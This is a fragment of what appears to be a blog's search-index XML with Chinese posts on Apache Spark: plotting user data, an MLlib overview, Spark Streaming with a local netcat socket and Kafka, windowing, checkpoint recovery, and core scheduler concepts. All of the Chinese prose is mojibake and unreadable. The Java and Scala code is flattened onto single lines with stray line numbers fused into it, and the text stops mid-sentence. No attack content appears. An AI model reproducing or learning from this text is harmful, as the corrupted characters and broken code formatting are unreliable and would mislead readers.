ageDF.describe().show() plt.hist(ageList) plt.title("Age distribution of the users\n") plt.xlabel("Age") plt.ylabel("Number of users") plt.show(block=False)#å¯†åº¦å›¾ from scipy.stats import gaussian_kde density = gaussian_kde(ageList) xAxisValues = np.linspace(0,100,1000) density.covariance_factor = lambda : .5 density._compute_covariance() plt.title("Age density plot of the users\n") plt.xlabel("Age") plt.ylabel("Density") plt.plot(xAxisValues, density(xAxisValues)) plt.show(block=False)#ç”ŸæˆåµŒå¥—å­å›¾ plt.subplot(121) plt.hist(ageList) plt.title("Age distribution of the users\n") plt.xlabel("Age") plt.ylabel("Number of users") plt.subplot(122) plt.title("Summary of distribution\n") plt.xlabel("Age") plt.boxplot(ageList, vert=False) plt.show(block=False)#æŸ±çŠ¶å›¾ occ10 = spark.sql("SELECT occupation, count(occupation) as usercount FROM users GROUP BY occupation ORDER BY usercount DESC LIMIT 10") occ10.show() occTuple = occ10.rdd.map(lambda p:(p.occupation,p.usercount)).collect() occList, countList = zip(*occTuple) occList y_pos = np.arange(len(occList)) plt.barh(y_pos, countList, align='center', alpha=0.4) plt.yticks(y_pos, occList) plt.xlabel('Number of users') plt.title('Top 10 user types\n') plt.gcf().subplots_adjust(left=0.15) plt.show(block=False)#å †æ ˆæ¡å½¢å›¾ occGender = spark.sql("SELECT occupation, gender FROM users") occGender.show() occCrossTab = occGender.stat.crosstab("occupation","gender") occupationsCrossTuple = occCrossTab.rdd.map(lambda p:(p.occupation_gender,p.M, p.F)).collect() occList, mList, fList = zip(*occupationsCrossTuple) N = len(occList) ind = np.arange(N) width = 0.75 p1 = plt.bar(ind, mList, width, color='r') p2 = plt.bar(ind, fList, width, color='y', bottom=mList) plt.ylabel('Count') plt.title('Gender distribution by occupation\n') plt.xticks(ind + width/2., occList, rotation=90) plt.legend((p1[0], p2[0]), ('Male', 'Female')) plt.gcf().subplots_adjust(bottom=0.25) plt.show(block=False)#é¥¼å›¾ occupationsBottom10 = spark.sql("SELECT occupation,count(occupation) as usercount FROM users GROUP BY occupation ORDER BY usercount LIMIT 10") occupationsBottom10Tuple = occupationsBottom10.rdd.map(lambda p:(p.occupation,p.usercount)).collect() occupationsBottom10List, countBottom10List =zip(*occupationsBottom10Tuple) explode = (0, 0.3, 0.2, 0.15,0.1,0,0,0,0,0.1) plt.pie(countBottom10List, explode=explode,labels=occupationsBottom10List, autopct='%1.1f%%', shadow=True,startangle=90) plt.title('Bottom 10 user types\n') plt.show(block=False)]]></content>
      <categories>
        <category>Spark</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Spark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-Spark-4]]></title>
    <url>%2F2018%2F07%2F20%2FSpark%2Fi-Spark-4%2F</url>
    <content type="text"><![CDATA[ä¸€. æœºå™¨å­¦ä¹ åˆ†ç±»1.ç›‘ç£å­¦ä¹  æœ‰è®­ç»ƒæ•°æ®é›†ã€‚è§„èŒƒæ•°æ®ã€‚åˆè§„æ•°æ®ã€‚äº§ç”Ÿæ¨æ–­å‡½æ•°.ç„¶åå¯¹æ–°æ•°æ®åº”ç”¨å‡½æ•°ã€‚ director actor edit Label 2.éç›‘ç£å­¦ä¹  æ²¡æœ‰è®­ç»ƒæ•°æ®ã€‚ åˆ†ç»„ã€‚ 3.æ¨è ååŒè¿‡æ»¤. çŒœæµ‹ä½ å–œæ¬¢. ç”µå•†ã€‚ äºŒ. Sparkæœºå™¨å­¦ä¹ åº“[Estimator] è¿è¡Œåœ¨åŒ…å«äº†featureå’Œlabel(ç»“æœ)çš„dataFrameä¹‹ä¸Šï¼Œå¯¹æ•°æ®è¿›è¡Œè®­ç»ƒåˆ›å»ºmodelã€‚ è¯¥æ¨¡å‹ç”¨äºä»¥åçš„é¢„æµ‹ã€‚ [Transformer] å°†åŒ…å«featureçš„Dataframeå˜æ¢æˆäº†åŒ…å«äº†é¢„æµ‹çš„dataframe. ç”±Estimatoråˆ›å»ºçš„modelå°±æ˜¯Transformerã€‚ [Parameter] Estimatorå’ŒTransformerä½¿ç”¨çš„æ•°æ®ï¼Œé€šå¸¸å’Œæœºå™¨å­¦ä¹ çš„ç®—æ³•ç›¸å…³ã€‚ Spark APIç»™å‡ºäº†ä¸€è‡´æ€§APIé’ˆå¯¹ç®—æ³•ã€‚ [Pipeline] å°†Estimatorså’ŒTransformersç»„åˆåœ¨ä¸€èµ·ï¼Œå½¢æˆæœºå™¨å­¦ä¹ å·¥ä½œæµ. æœºå™¨å­¦ä¹ åº”ç”¨æ­¥éª¤ è¯»å–æ•°æ®æ–‡ä»¶å½¢æˆè®­ç»ƒæ•°æ®æ¡† åˆ›å»ºLinearRegressionå¹¶è®¾ç½®å‚æ•° å¯¹è®­ç»ƒæ•°æ®è¿›è¡Œæ¨¡å‹æ‹Ÿåˆï¼Œå®Œæˆè¯„ä¼°ç®¡çº¿. åˆ›å»ºåŒ…å«æµ‹è¯•æ•°æ®çš„DataFrameï¼Œå…¸å‹åŒ…å«featureå’Œlabelï¼Œå¯ä»¥é€šè¿‡æ¯”è¾ƒé¢„æµ‹æ ‡ç­¾å’Œæµ‹è¯•æ ‡ç­¾ç¡®è®¤modelæ˜¯okï¼Œ ä½¿ç”¨æ¨¡å‹ï¼Œå¯¹æµ‹è¯•æ•°æ®è¿›è¡Œå˜æ¢(åº”ç”¨æ¨¡å‹),æŠ½å–feature ï¼Œlabelï¼Œpredication. ä¸‰. ä»£ç å®ä¾‹1. çº¿æ€§å›å½’ æµ‹è¯•æ¡ˆä¾‹ 2. é€»è¾‘å›å½’ é…’è´¨é‡é¢„æµ‹ åƒåœ¾é‚®ä»¶è¿‡æ»¤ 3. ALS (æœ€å°äºŒä¹˜æ³•) å•†å“æ¨è: æ·»åŠ å‘æŒ‡å®šç”¨æˆ·æ¨ènæ¬¾å•†å“; å°†æŒ‡å®šçš„å•†å“æ¨èç»™nä¸ªç”¨æˆ·; å‘æ‰€æœ‰ç”¨æˆ·æ¨ènç§å•†å“ ç”µå½±æ¨è: ALSç®—æ³•ç”µå½±æ¨è]]></content>
      <categories>
        <category>Spark</category>
        <category>MLLib</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>MLLib</tag>
        <tag>æœºå™¨å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-Spark-3]]></title>
    <url>%2F2018%2F07%2F20%2FSpark%2Fi-Spark-3%2F</url>
    <content type="text"><![CDATA[ä¸€. Spark Streaming ç®€ä»‹1.ä»‹ç» æ˜¯ spark core çš„æ‰©å±•ï¼Œé’ˆå¯¹å®æ—¶æ•°æ®æµå¤„ç†,å…·æœ‰å¯æ‰©å±•ã€é«˜ååé‡ã€å®¹é”™. æ•°æ®å¯ä»¥æ˜¯æ¥è‡ªäºkafka, flume, tcpsocket,ä½¿ç”¨é«˜çº§å‡½æ•°(map reduce filter ,join , window) å¤„ç†çš„æ•°æ®å¯ä»¥æ¨é€åˆ° database, hdfs, é’ˆå¯¹æ•°æ®æµå¤„ç†å¯ä»¥åº”ç”¨åˆ°æœºå™¨å­¦ä¹ å’Œå›¾è®¡ç®—ä¸­ã€‚ 2. DStream (Discretized Stream ) ç¦»æ•£æµæ¦‚å¿µ: ç¦»æ•£æµ,è¡¨ç¤ºçš„æ˜¯è¿ç»­çš„æ•°æ®æµã€‚è¿ç»­çš„RDDåºåˆ—ã€‚å‡†å®æ—¶è®¡ç®—ã€‚ é€šè¿‡kafkaã€flumeç­‰è¾“å…¥æ•°æ®æµäº§ç”Ÿï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¯¹å…¶ä»–DStreamè¿›è¡Œé«˜é˜¶å˜æ¢äº§ç”Ÿã€‚ åœ¨å†…éƒ¨ï¼ŒDStreamè¡¨ç°ä¸ºRDDåºåˆ—ã€‚ æ³¨æ„äº‹é¡¹: å¯åŠ¨ä¸Šä¸‹æ–‡ä¹‹åï¼Œä¸èƒ½å¯åŠ¨æ–°çš„ç¦»æ•£æµ ä¸Šä¸‹æ–‡åœæ­¢åä¸èƒ½restart åŒä¸€ JVMåªæœ‰ä¸€ä¸ª active çš„ StreamingContext åœæ­¢StreamingContextä¼šä¸€åŒstopæ‰SparkContextï¼Œå¦‚è‹¥åªåœæ­¢StreamingContext. ssc.stop(false|true); :TODO SparkContextå¯ä»¥åˆ›å»ºå¤šä¸ªStreamingContext, åˆ›å»ºæ–°çš„ä¹‹å‰åœæ‰æ—§çš„ã€‚ DStreamå’ŒReceiver: ä»‹ç» Receiveræ˜¯æ¥å—è€…ï¼Œä»sourceæ¥å—æ•°æ®ï¼Œå­˜å‚¨åœ¨å†…å­˜ä¸­ä¾›sparkå¤„ç†ã€‚ æº åŸºæœ¬æº:fileSystem | socket,å†…ç½®APIæ”¯æŒã€‚ é«˜çº§æº:kafka | flume | â€¦ï¼Œéœ€è¦å¼•å…¥pom.xmlä¾èµ–. æ³¨æ„ ä½¿ç”¨localæ¨¡å¼æ—¶ï¼Œä¸èƒ½ä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹.ä½¿ç”¨çš„local[n]ï¼Œnéœ€è¦å¤§äºreceiverçš„ä¸ªæ•°ã€‚ äºŒ. ä½“éªŒSpark Streaming1.å¼•å…¥ pom ä¾èµ–12345&lt;dependency&gt; &lt;groupId&gt;org.apache.spark&lt;/groupId&gt; &lt;artifactId&gt;spark-streaming_2.11&lt;/artifactId&gt; &lt;version&gt;2.1.0&lt;/version&gt;&lt;/dependency&gt; 2. Scala æ“ä½œä»£ç  in IDEA123456789101112131415161718192021222324//local[n] n &gt; 1val conf = new SparkConf().setMaster("local[2]").setAppName("NetworkWordCount")//åˆ›å»ºSparkæµä¸Šä¸‹æ–‡,æ‰¹æ¬¡æ—¶é•¿æ˜¯1sval ssc = new StreamingContext(conf, Seconds(1))//åˆ›å»ºsocketæ–‡æœ¬æµval lines = ssc.socketTextStream("localhost", 9999)//å‹æ‰val words = lines.flatMap(_.split(" "))//å˜æ¢æˆå¯¹å¶val pairs = words.map((_,1));// åŒ–ç®€val count = pairs.reduceByKey(_+_) ;count.print()//å¯åŠ¨ssc.start()//ç­‰å¾…ç»“æŸssc.awaitTermination() 3. é€šè¿‡ nc ä¸ Spark äº¤äº’1234567891011121&gt; å¯åŠ¨ ncnc -lk 99992&gt; è¿è¡Œ Spark Streaming ä»£ç , å¼€å¯ç›‘å¬ localhost:9999 3&gt; åœ¨ nc å‘½ä»¤è¡Œè¾“å…¥å•è¯ $&gt; hello world $&gt; ....$&gt; è§‚å¯Ÿ spark æ§åˆ¶å°æ‰“å°PS: æŠŠ log4j æ–‡ä»¶æ”¾åˆ°é¡¹ç›®çš„ resources ä¸‹, è®¾ç½®log4j çš„æ‰“å°çº§åˆ«ä¸º WARN, å¦åˆ™å¾ˆéš¾è§‚å¯Ÿæ¸…æ¥š log4j æ–‡ä»¶è¯·å‚è€ƒ 4.å¯¼å‡º Spark Streaming ä¸º jar åŒ…, æ”¾åˆ° Linux ä¸‹è¿è¡Œæ³¨æ„: ç›´æ¥spark-submit æˆ–è€… spark-submit â€“help , ä¼šå¼¹å‡ºå¸®åŠ© 1234$&gt; spark-submit --name wcstreaming --class com.rox.spark.scala.SparkStreamingDemo --master spark://cs1:7077 SparkDemo1-1.0-SNAPSHOT.jar ä¸‰. Kafka ä¸ Spark Streaming æ•´åˆ1. å›å¿†Kafka123456789101112131&gt; å¯åŠ¨ kafka,cs2~cs4 å‰æå…ˆå¯åŠ¨ zk $&gt; kafka-server-start.sh /home/ap/apps/kafka/config/server.properties 2&gt; æŸ¥çœ‹ä¸»é¢˜: $&gt; kafka-topics.sh --zookeeper cs1:2181 --list 3&gt; å¼€å¯æ¶ˆè´¹è€…[ap@cs4]~%&gt; kafka-console-consumer.sh --zookeeper cs3:2181 --topic kafka-test4&gt; å¼€å¯ç”Ÿäº§è€…[ap@cs2]~%&gt; kafka-console-producer.sh --broker-list cs4:9092 --topic kafka-test &gt;&gt; åœ¨ç”Ÿäº§è€…å‘é€æ¶ˆæ¯, æŸ¥çœ‹æ¶ˆè´¹è€… 2. ä½¿ç”¨ Javaç¼–å†™ Kafka-SparkStreaming ä»£ç å…·ä½“è§ github 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980package com.rox.spark.java;import java.util.*;import org.apache.spark.SparkConf;import org.apache.spark.TaskContext;import org.apache.spark.api.java.*;import org.apache.spark.api.java.function.*;import org.apache.spark.streaming.Seconds;import org.apache.spark.streaming.api.java.*;import org.apache.spark.streaming.kafka010.*;import org.apache.kafka.clients.consumer.ConsumerRecord;import org.apache.kafka.common.TopicPartition;import org.apache.kafka.common.serialization.StringDeserializer;import scala.Tuple2;public class KafkaSparkstreamingDemo &#123; public static void main(String[] args) throws Exception &#123; SparkConf conf = new SparkConf(); conf.setAppName("KafkaSparkstreamingDemo"); conf.setMaster("local[4]"); //åˆ›å»ºSparkæµåº”ç”¨ä¸Šä¸‹æ–‡ JavaStreamingContext streamingContext = new JavaStreamingContext(conf, Seconds.apply(2)); Map&lt;String, Object&gt; kafkaParams = new HashMap&lt;&gt;(); kafkaParams.put("bootstrap.servers", "cs2:9092,cs3:9092"); kafkaParams.put("key.deserializer", StringDeserializer.class); kafkaParams.put("value.deserializer", StringDeserializer.class); kafkaParams.put("group.id", "g6"); kafkaParams.put("auto.offset.reset", "latest"); kafkaParams.put("enable.auto.commit", false); Collection&lt;String&gt; topics = Arrays.asList("kafka-test"); // å–å‡º kafka stream final JavaInputDStream&lt;ConsumerRecord&lt;String, String&gt;&gt; stream = KafkaUtils.createDirectStream( streamingContext, LocationStrategies.PreferConsistent(), ConsumerStrategies.&lt;String, String&gt;Subscribe(topics, kafkaParams) ); // å‹æ‰ JavaDStream&lt;String&gt; wordDS = stream.flatMap(new FlatMapFunction&lt;ConsumerRecord&lt;String, String&gt;, String&gt;() &#123; @Override public Iterator&lt;String&gt; call(ConsumerRecord&lt;String, String&gt; r) throws Exception &#123; String value = r.value(); List&lt;String&gt; list = new ArrayList&lt;&gt;(); String[] arr = value.split(" "); for (String s : arr) &#123; list.add(s); &#125; return list.iterator(); &#125; &#125;); // æ˜ å°„æˆå…ƒç¥– (æ‹¼1) JavaPairDStream&lt;String,Integer&gt; pairDS = wordDS.mapToPair(new PairFunction&lt;String, String, Integer&gt;() &#123; @Override public Tuple2&lt;String, Integer&gt; call(String s) throws Exception &#123; return new Tuple2&lt;String, Integer&gt;(s,1); &#125; &#125;); // èšåˆ JavaPairDStream&lt;String, Integer&gt; countDS = pairDS.reduceByKey(new Function2&lt;Integer, Integer, Integer&gt;() &#123; @Override public Integer call(Integer v1, Integer v2) throws Exception &#123; return v1 + v2; &#125; &#125;); // æ‰“å°è®¡ç®—ç»“æœ countDS.print(); streamingContext.start(); streamingContext.awaitTermination(); &#125;&#125; å››. è·¨å•ä½æ—¶é—´,å•ä½è·ç¦» (Window) , è·¨æ‰¹æ¬¡(updateStateByKey)1. Windowå…³é”®å‚æ•°:batch interval æ‰¹æ¬¡çš„é—´éš”. windows length çª—å£é•¿åº¦,è·¨æ‰¹æ¬¡ã€‚æ˜¯æ‰¹æ¬¡çš„æ•´æ•°å€ã€‚ slide interval æ»‘åŠ¨é—´éš”,çª—å£è®¡ç®—çš„é—´éš”æ—¶é—´ï¼Œæœ‰æ—¶æ‰¹æ¬¡intervalçš„æ•´å€æ•°ã€‚ å…³é”®ä»£ç ç¤ºä¾‹:å…·ä½“æŸ¥çœ‹ github 123456789101112//èšåˆ/** ç»Ÿè®¡åŒä¸€ window ä¸‹çš„ key çš„èšåˆ (ç”¨çš„æ¯”è¾ƒå¤š...) def reduceByKeyAndWindow(reduceFunc: Function2[V, V, V], windowDuration: Duration, slideDuration: Duration): JavaPairDStream[K, V] &gt;&gt;&gt; Return a new DStream by applying `reduceByKey` over a sliding window*/JavaPairDStream&lt;String,Integer&gt; countDS = pairDS.reduceByKeyAndWindow(new Function2&lt;Integer, Integer, Integer&gt;() &#123; public Integer call(Integer v1, Integer v2) &#123; return v1 + v2; &#125;&#125;,Seconds.apply(6),Seconds.apply(4)); 2. updateStateByKeyè·¨æ‰¹æ¬¡ç»Ÿè®¡, ä¼šä¸€ç›´ç´¯åŠ , å…·ä½“æŸ¥çœ‹ github å…³é”®ä»£ç ç¤ºä¾‹12345678910111213// å¯ç”¨äºè·¨æ‰¹æ¬¡ç»Ÿè®¡ updateStateByKeyaJavaPairDStream&lt;String,Integer&gt; jps = pairDS.updateStateByKey(new Function2&lt;List&lt;Integer&gt;, Optional&lt;Integer&gt;, Optional&lt;Integer&gt;&gt;() &#123; public Optional&lt;Integer&gt; call(List&lt;Integer&gt; v1, Optional&lt;Integer&gt; v2) throws Exception &#123; Integer newCount = v2.isPresent() ? v2.get() : 0 ; System.out.println("old value : " + newCount); for(Integer i : v1)&#123; System.out.println("new value : " + i); newCount = newCount + i; &#125; return Optional.of(newCount); &#125;&#125;); äº”. spark streamingä¸­çš„å®¹é”™å®ç° â€»1.ç”Ÿäº§ç¯å¢ƒä¸­spark streamingçš„jobçš„æ³¨æ„äº‹é¡¹é¿å…å•ç‚¹æ•…éšœã€‚ Driver é©±åŠ¨,è¿è¡Œç”¨æˆ·ç¼–å†™çš„ç¨‹åºä»£ç çš„ä¸»æœºã€‚ Executors æ‰§è¡Œçš„spark driveræäº¤çš„job,å†…éƒ¨å«æœ‰é™„åŠ ç»„ä»¶æ¯”å¦‚receiver receiveræ¥å—æ•°æ®å¹¶ä»¥blockæ–¹å¼ä¿å­˜åœ¨memoryä¸­ï¼ŒåŒæ—¶ï¼Œå°†æ•°æ®å—å¤åˆ¶åˆ°å…¶ä»–executorä¸­ï¼Œä»¥å¤‡å®¹é”™ã€‚ æ¯ä¸ªæ‰¹æ¬¡æœ«ç«¯ä¼šå½¢æˆæ–°çš„DStreamï¼Œäº¤ç»™ ä¸‹æ¸¸å¤„ç†ã€‚ å¦‚æœreceiveræ•…éšœï¼Œå…¶ä»–æ‰§è¡Œå™¨ä¸­çš„receiverä¼šå¯åŠ¨è¿›è¡Œæ•°æ®çš„æ¥æ”¶ã€‚ checkpoint æ£€æŸ¥ç‚¹ ç”¨äºå®¹é”™å¤„ç†, è®¾ç½®å, ä¼šæŠŠæ•°æ®å­˜å‚¨åˆ°æ£€æŸ¥ç‚¹ç›®å½•, å½“å‡ºé—®é¢˜å, ä»æ£€æŸ¥ç‚¹æ¢å¤. 2. é€šè¿‡checkpoint å®ç° Spark Streaming çš„å®¹é”™å¦‚æœexecutoræ•…éšœï¼Œæ‰€æœ‰æœªè¢«å¤„ç†çš„æ•°æ®éƒ½ä¼šä¸¢å¤±ï¼Œè§£å†³åŠæ³•å¯ä»¥é€šè¿‡wal (hbase,hdfs/WALs)æ–¹å¼å°†æ•°æ®é¢„å…ˆå†™å…¥åˆ°hdfsæˆ–è€…s3. å¦‚æœDriveræ•…éšœï¼Œdriverç¨‹åºå°±ä¼šåœæ­¢ï¼Œæ‰€æœ‰executoréƒ½æ˜¯ä¸¢å¤±è¿æ¥ï¼Œåœæ­¢è®¡ç®—è¿‡ç¨‹ã€‚ è§£å†³åŠæ³•éœ€è¦é…ç½®å’Œç¼–ç¨‹ã€‚ é…ç½®Driverç¨‹åºè‡ªåŠ¨é‡å¯ï¼Œä½¿ç”¨ç‰¹å®šçš„clustermanagerå®ç°ã€‚ :TODO how? é‡å¯æ—¶ï¼Œä»å®•æœºçš„åœ°æ–¹è¿›è¡Œé‡å¯ï¼Œé€šè¿‡æ£€æŸ¥ç‚¹æœºåˆ¶å¯ä»¥å®ç°è¯¥åŠŸèƒ½ã€‚ æ£€æŸ¥ç‚¹ç›®å½•å¯ä»¥æ˜¯æœ¬åœ°ï¼Œå¯ä»¥æ˜¯hdfs, ç”Ÿäº§ä¸­ä¸€èˆ¬éƒ½æ˜¯ hdfs ä¸å†ä½¿ç”¨newæ–¹å¼åˆ›å»ºSparkStreamContextå¯¹è±¡ï¼Œè€Œæ˜¯é€šè¿‡å·¥å‚æ–¹å¼JavaStreamingContext.getOrCreate()æ–¹æ³•åˆ›å»º ä¸Šä¸‹æ–‡å¯¹è±¡,é¦–å…ˆä¼šæ£€æŸ¥æ£€æŸ¥ç‚¹ç›®å½•ï¼Œçœ‹æ˜¯å¦æœ‰jobè¿è¡Œï¼Œæ²¡æœ‰å°±newæ–°çš„ã€‚ ç¼–å†™å®¹é”™æµ‹è¯•ä»£ç ,è®¡ç®—è¿‡ç¨‹ç¼–å†™åˆ° Function0 çš„callæ–¹æ³•ä¸­ã€‚ çŸ¥è¯†ç‚¹: Function0, 1, 2, 3, 4 12345678ä¸ºä½•è¦ä½¿ç”¨ Function0? å› ä¸º JavaStreamingContext.getOrCreate(path,function0) çš„ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯ Function0/** * A zero-argument function that returns an R. */public interface Function0&lt;R&gt; extends Serializable &#123; R call() throws Exception;&#125; Java ä»£ç , å…·ä½“è§ github 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.rox.spark.java;import org.apache.spark.SparkConf;import org.apache.spark.api.java.function.Function0;import org.apache.spark.streaming.Duration;import org.apache.spark.streaming.api.java.JavaDStream;import org.apache.spark.streaming.api.java.JavaStreamingContext;public class SparkStreamingCheckpointDemo &#123; public static void main(String[] args) throws Exception &#123; /** * Create a factory object that can create and setup a new JavaStreamingContext * å¯ä»¥ä½¿ç”¨ Function0 * A zero-argument function that returns an R. */ Function0&lt;JavaStreamingContext&gt; contextFactory = new Function0&lt;JavaStreamingContext&gt;()&#123; @Override // é¦–æ¬¡åˆ›å»º context æ—¶, è°ƒç”¨æ­¤æ–¹æ³• public JavaStreamingContext call() throws Exception &#123; SparkConf conf = new SparkConf(); conf.setMaster("local[4]"); conf.setAppName("SparkStreamingCheckpointDemo"); // åˆ›å»ºæµä¸Šä¸‹æ–‡å¯¹è±¡ JavaStreamingContext jsc = new JavaStreamingContext(conf, new Duration(2 * 1000)); // Create an input stream from network source hostname:port. JavaDStream&lt;String&gt; lines = jsc.socketTextStream("localhost", 10086); // =============== å˜æ¢ä»£ç  =============== // è®¾ç½®ä¸€ä¸ªçª—å£æ—¶é•¿ä¸º1å¤©, æ»šåŠ¨é—´éš”ä¸º 2s JavaDStream&lt;Long&gt; longJavaDStream = lines.countByWindow(new Duration(24 * 60 * 60 * 1000), new Duration(2 * 1000)); longJavaDStream.print(); // è®¾ç½®æ£€æŸ¥ç‚¹ ç›®å½• jsc.checkpoint("file:///Users/shixuanji/Documents/Code/temp/check"); // è¿”å›æµä¸Šä¸‹æ–‡å¯¹è±¡ return jsc; &#125; &#125;; /** * def getOrCreate( checkpointPath: String, creatingFunc: JFunction0[JavaStreamingContext] ): JavaStreamingContext æ³¨æ„: ç¬¬2ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª Function0å¯¹è±¡ */ // å¤±è´¥å, é‡æ–°åˆ›å»ºæ—¶, ä¼šç»è¿‡æ£€æŸ¥ç‚¹ JavaStreamingContext context = JavaStreamingContext.getOrCreate("file:///Users/shixuanji/Documents/Code/temp/check", contextFactory); context.start(); context.awaitTermination(); &#125;&#125;]]></content>
      <categories>
        <category>Spark</category>
        <category>SparkStreaming</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Spark</tag>
        <tag>SparkStreaming</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-Spark-2]]></title>
    <url>%2F2018%2F07%2F20%2FSpark%2Fi-Spark-2%2F</url>
    <content type="text"><![CDATA[ä¸€. Spark æ ¸å¿ƒ API[SparkContext] è¿æ¥åˆ°sparké›†ç¾¤,å…¥å£ç‚¹. [HadoopRDD] è¯»å–hadoopä¸Šçš„æ•°æ®ï¼Œ [MapPartitionsRDD] é’ˆå¯¹çˆ¶RDDçš„æ¯ä¸ªåˆ†åŒºæä¾›äº†å‡½æ•°æ„æˆçš„æ–°ç±»å‹RDD. [PairRDDFunctions] å¯¹å¶RDDå‡½æ•°ç±»ã€‚ å¯ç”¨äºKVç±»å‹RDDçš„é™„åŠ å‡½æ•°ã€‚å¯ä»¥é€šè¿‡éšå¼è½¬åŒ–å¾—åˆ°. [ShuffleRDD] ä»Shuffleä¸­è®¡ç®—ç»“æœçš„RDD. [RDD] æ˜¯åˆ†åŒºçš„é›†åˆ, å¼¹æ€§åˆ†å¸ƒå¼æ•°æ®é›†, ä¸å¯å˜çš„æ•°æ®åˆ†åŒºé›†åˆ. åŸºæœ¬æ“ä½œ(map filter , persist) ç‰¹ç‚¹: åˆ†åŒºåˆ—è¡¨ //æ•°æ® åº”ç”¨ç»™æ¯ä¸ªåˆ‡ç‰‡çš„è®¡ç®—å‡½æ•° //è¡Œä¸º åˆ°å…¶ä»–RDDçš„ä¾èµ–åˆ—è¡¨ //ä¾èµ–å…³ç³» (å¯é€‰)é’ˆå¯¹kvç±»å‹RDDçš„åˆ†åŒºç±» (å¯é€‰)é¦–é€‰ä½ç½®åˆ—è¡¨ [DAGScheduler] é«˜çº§è°ƒåº¦å™¨å±‚é¢ï¼Œå®ç°æŒ‰ç…§é˜¶æ®µ(stage) è¿›è¡Œ shuffle å¯¹æ¯ä¸ªJOBçš„å„é˜¶æ®µ(stage)è®¡ç®—æœ‰å‘æ— ç¯å›¾(DAG)ï¼Œå¹¶ä¸”è·Ÿè¸ªRDDå’Œæ¯ä¸ªé˜¶æ®µçš„è¾“å‡ºã€‚ æ‰¾å‡ºæœ€å°è°ƒåº¦è¿è¡Œä½œä¸š, å°†Stageå¯¹è±¡ä»¥TaskSetæ–¹å¼æäº¤ç»™åº•å±‚çš„è°ƒåº¦å™¨ã€‚ åº•å±‚è°ƒåº¦å™¨å®ç°TaskScheduler, è¿›è€Œåœ¨clusterä¸Šè¿è¡Œjob. TaskSetå·²ç»åŒ…å«äº†å…¨éƒ¨çš„å•ç‹¬çš„taskï¼Œè¿™äº›Taskéƒ½èƒ½å¤ŸåŸºäºclusterçš„æ•°æ®è¿›è¡Œæ­£ç¡®è¿è¡Œã€‚ Stageé€šè¿‡åœ¨éœ€è¦shuffleçš„è¾¹ç•Œå¤„å°†RDDæ‰“ç¢æ¥åˆ›å»ºStageå¯¹è±¡ã€‚ å…·æœ‰çª„ä¾èµ–çš„RDDæ“ä½œ(æ¯”å¦‚map /filter)è¢«ç®¡é“åŒ–è‡³ä¸€ä¸ªtasksetä¸­. è€Œå…·æœ‰shuffleä¾èµ–çš„æ“ä½œåˆ™åŒ…å«å¤šä¸ªStage(ä¸€ä¸ªè¿›è¡Œè¾“å‡ºï¼Œå¦ä¸€ä¸ªè¿›è¡Œè¾“å…¥) æœ€åï¼Œæ¯ä¸ªstageéƒ½æœ‰ä¸€ä¸ªé’ˆå¯¹å…¶ä»–stageçš„shuffleä¾èµ–ï¼Œå¯ä»¥è®¡ç®—å¤šä¸ªæ“ä½œã€‚ DAGè°ƒåº¦å™¨æ£€æµ‹é¦–é€‰ä½ç½®æ¥è¿è¡Œtaskï¼Œé€šè¿‡åŸºäºå½“å‰çš„ç¼“å­˜çŠ¶æ€ï¼Œå¹¶ä¼ é€’ç»™åº•å±‚çš„taskè°ƒåº¦å™¨æ¥å®ç°ã€‚æ ¹æ®shuffleçš„è¾“å‡ºæ˜¯å¦ä¸¢å¤±å¤„ç†æ•…éšœé—®é¢˜ã€‚ ä¸æ˜¯å› ä¸ºéšæœºæ–‡ä»¶ä¸¢å¤±é€ æˆçš„æ•…éšœä¼šç”±ä»»åŠ¡è°ƒåº¦ç¨‹åºå¤„ç†ï¼Œå®ƒåœ¨å–æ¶ˆæ•´ä¸ªstageå‰èŠ±ä¸€å°æ®µæ—¶é—´é‡è¯•æ¯ä¸ªä»»åŠ¡ ä¸ºäº†å®¹é”™ï¼ŒåŒä¸€stageå¯èƒ½ä¼šè¿è¡Œå¤šæ¬¡ï¼Œç§°ä¹‹ä¸ºâ€attemptsâ€,å¦‚æœtaskè°ƒåº¦å™¨æŠ¥å‘Šäº†ä¸€ä¸ªæ•…éšœ(è¯¥æ•…éšœæ˜¯ç”±äºä¸Šä¸€ä¸ªstageä¸¢å¤±è¾“å‡ºæ–‡ä»¶è€Œå¯¼è‡´çš„)DAGè°ƒåº¦å°±ä¼šé‡æ–°æäº¤ä¸¢å¤±çš„stageã€‚è¿™ä¸ªé€šè¿‡å…·æœ‰ FetchFailedçš„CompletionEventå¯¹è±¡æˆ–è€…ExecutorLostè¿›è¡Œæ£€æµ‹çš„ã€‚ DAGè°ƒåº¦å™¨ä¼šç­‰å¾…ä¸€æ®µæ—¶é—´çœ‹å…¶ä»–èŠ‚ç‚¹æˆ–taskæ˜¯å¦å¤±è´¥ï¼Œç„¶åå¯¹ä¸¢å¤±çš„stageé‡æ–°æäº¤tasksetï¼Œè®¡ç®—ä¸¢å¤±çš„taskã€‚ æœ¯è¯­ä»‹ç»[ job ] æäº¤ç»™è°ƒåº¦çš„é¡¶å±‚çš„å·¥ä½œé¡¹ç›®ï¼Œç”± ActiveJob è¡¨ç¤ºã€‚ æ˜¯Stageé›†åˆã€‚ [Stage] æ˜¯taskçš„é›†åˆï¼Œè®¡ç®—jobä¸­çš„ä¸­é—´ç»“æœã€‚åŒä¸€RDDçš„æ¯ä¸ªåˆ†åŒºéƒ½ä¼šåº”ç”¨ç›¸åŒçš„è®¡ç®—å‡½æ•°ã€‚ åœ¨shuffleçš„è¾¹ç•Œå¤„è¿›è¡Œéš”ç¦»(å› 